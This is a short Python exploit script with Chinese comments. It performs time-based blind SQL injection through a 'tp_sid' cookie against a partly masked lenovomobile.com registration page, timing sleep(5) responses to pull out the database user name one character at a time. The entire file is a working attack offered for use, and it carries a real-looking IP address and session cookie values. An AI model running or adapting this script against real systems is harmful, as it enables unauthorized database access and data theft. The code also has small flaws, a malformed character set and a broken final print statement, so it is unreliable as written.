#! /usr/bin/env python
# -*- coding: utf-8 -*-
# Author: Xuchao

import requests
import time

payloads = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'  # 匹配用的字符串

user = ''  # 存匹配到的字符的字符串
print ('Start to retrive current user:')
for i in range(1, 23):  # 数据长度 这里我偷了下懒 没有先获取长度
    for payload in payloads:  # 遍历取出字符
        startTime = time.time()
        url = r'http://xxxxx.lenovomobile.com/?lenovo/regist.html=&username=&email=&submit=%E6%8F%90%E4%BA%A4%E8%B5%84%E6%96%99'  # url
        cookies = {
            'first_sourceid': r"223.202.62.227",
            'first_domain': r"223.202.62.227",
            'ln_v': r"vid%3D%3E157dd50b5eb5808%7C%7C%7Cfsts%3D%3E1476886836710%7C%7C%7Cdsfs%3D%3E17077%7C%7C%7Cnps%3D%3E7",
            'tp_sid': r"EWeFPJ'%2b(select*from(select if(user() like '" + user + payload + r"%',sleep(5),0))a)%2b'",
        # 连接payload
        }
        response = requests.get(url, cookies=cookies)  # 发送请求
        if time.time() - startTime > 5:  # 判断是否延时了5秒
            user += payload  # 是的话连接进user里 然后退出当前这一层的循环
            print('user is:' + user)
            break
print('\n[Done] current user is %s') % user  # 匹配不出数据后 打印user变量